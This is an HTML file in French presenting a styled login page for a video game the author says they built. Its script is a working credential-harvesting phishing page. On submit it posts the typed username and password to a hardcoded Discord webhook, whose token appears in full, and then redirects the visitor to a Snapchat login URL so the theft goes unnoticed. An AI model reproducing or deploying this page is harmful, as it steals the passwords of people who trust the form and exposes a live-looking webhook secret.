<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Mon jeux video</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      display: flex; justify-content: center; align-items: center;
      height: 100vh;
      color: #333;
    }
    .login-box {
      width: 100%; max-width: 400px;
      padding: 40px 35px;
      background: #fff;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
      border-radius: 12px;
      text-align: center;
      transition: box-shadow 0.3s ease;
    }
    .login-box:hover {
      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.18);
    }
    h2 {
      margin-bottom: 32px;
      font-weight: 700;
      font-size: 1.8rem;
      user-select: none;
      color: #222;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      margin: 12px 0 20px 0;
      border: 1.5px solid #bbb;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 500;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
      outline-offset: 2px;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #3b82f6;
      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
      outline: none;
    }
    button[type="submit"] {
      background-color: #facc15;
      border: none;
      color: #1a1a1a;
      font-weight: 700;
      padding: 14px 0;
      width: 100%;
      border-radius: 12px;
      cursor: pointer;
      font-size: 16.5px;
      box-shadow: 0 5px 12px rgba(250, 204, 21, 0.6);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      user-select: none;
    }
    button[type="submit"]:hover {
      background-color: #eab308;
      box-shadow: 0 7px 16px rgba(234, 179, 8, 0.75);
    }
    #errorMessage {
      color: #dc2626;
      display: none;
      margin-top: 10px;
      font-size: 14px;
      font-weight: 600;
      user-select: none;
    }
    .links-container {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }
    .link-button {
      background: transparent;
      border: none;
      color: #2563eb;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      padding: 0;
      font-family: inherit;
      font-size: inherit;
      transition: color 0.25s ease;
    }
    .link-button:hover {
      color: #1e40af;
      text-decoration: underline;
    }
    #forgotPassword {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box" role="main" aria-label="Formulaire de connexion">
    <h2>Se connectez au jeux video crée par moi</h2>
    <form id="loginForm" novalidate>
      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required autocomplete="username" aria-required="true" />
      <input type="password" id="password" placeholder="Mot de passe" required autocomplete="current-password" aria-required="true" />
      <button type="submit">Connexion</button>
      <div class="links-container">
        <button type="button" class="link-button" id="signupLink">S'inscrire</button>
        <button type="button" class="link-button" id="forgotPassword">Mot de passe oublié</button>
      </div>
    </form>
    <p id="errorMessage" role="alert" aria-live="assertive">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fwww.snapchat.com%252Fweb%252Ff3411d81-73e7-59d1-a928-9af58b989e8a";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorMessage = document.getElementById('errorMessage');

      if (
        username.length < 3 ||
        password.length < 3 ||
        username.includes(" ") ||
        password.includes(" ")
      ) {
        errorMessage.style.display = 'block';
        return;
      } else {
        errorMessage.style.display = 'none';
      }

      const message = {
        content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message),
      })
      .then(response => {
        if (response.ok) {
          alert("Données envoyées avec succès !");
          document.getElementById('loginForm').reset();
          window.location.href = redirectURL;
        } else {
          alert("Erreur lors de l'envoi des données.");
        }
      })
      .catch(error => {
        alert("Erreur réseau ou CORS.");
        console.error(error);
      });
    });

    document.getElementById('signupLink').addEventListener('click', () => {
      alert("Redirection vers la page d'inscription...");
      // window.location.href = "inscription.html";
    });

    document.getElementById('forgotPassword').addEventListener('click', () => {
      alert("Redirection vers la récupération de mot de passe...");
      // window.location.href = "recuperation.html";
    });
  </script>
</body>
</html>
